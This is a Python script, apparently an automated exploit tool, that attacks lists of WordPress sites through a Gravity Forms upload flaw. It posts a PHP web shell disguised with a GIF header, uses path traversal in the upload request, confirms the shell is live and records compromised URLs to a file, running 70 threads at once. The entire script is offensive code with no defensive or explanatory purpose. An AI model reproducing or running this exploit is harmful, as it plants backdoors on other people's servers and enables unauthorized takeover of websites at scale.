#!/usr/bin/python

import requests, os, sys, codecs
from multiprocessing.dummy import Pool
from time import time as timer
import time
from random import sample as rand
from platform import system
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)

####### Colors	 ######
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.YELLOW
fg  =   Fore.YELLOW
sd  =   Style.BRIGHT
sn  =   Style.NORMAL
sb  =   Style.BRIGHT
####################### 

try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))



def banners():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
		banner = """{}{} \n \n

  ____                 _ _
 / ___|_ __ __ ___   _(_) |_ _   _ ___   _ __  _   _
| |  _| '__/ _` \ \ / / | __| | | / __| | '_ \| | | |
| |_| | | | (_| |\ V /| | |_| |_| \__ \_| |_) | |_| |
 \____|_|  \__,_| \_/ |_|\__|\__, |___(_) .__/ \__, |
                             |___/      |_|    |___/
									
   
    

		\n""".format(fc, sb)
		
		print banner

shell = """GIF89a <?php echo 'Priv8 Uploaders By En Banglasia'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); echo '<center><form method="post" target="_self" enctype="multipart/form-data"><input type="file" size="20" name="uploads"/><input type="submit" value="upload"/></form></center></td></tr></table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     echo "<script>alert('upload Done'); 	 	 </script><b>Fuckedz!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
filename = "Fuckedz.jpg"

def rand_str (len = None) :
	if len == None :
		len = 8
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))

def ExploitS(url):
    try:
		
		

		
		
		# 1 .   Gravity Forms
		
		
		appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../',
		'name':'2K19.phtml'}
		
		
		Grav = {'file':(filename, shell, 'text/html')}
		
		Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		
		Gravlib = requests.get(url+'/wp-content/uploads/_input_3_2K19.phtml')
		
		
		if 'En Banglasia' in Gravlib.content:
			print '[{}Wordpress]: {}{} => {}{} Gravitys {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/uploads/_input_3_2K19.phtml'+'\n')
		else:
			print '[{}Wordpress]: {}{} => {}{} Gravitys {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)			
			


			
    except:
        pass



		
banners()

	
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(70)
        Threads = ThreadPool.map(ExploitS, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()
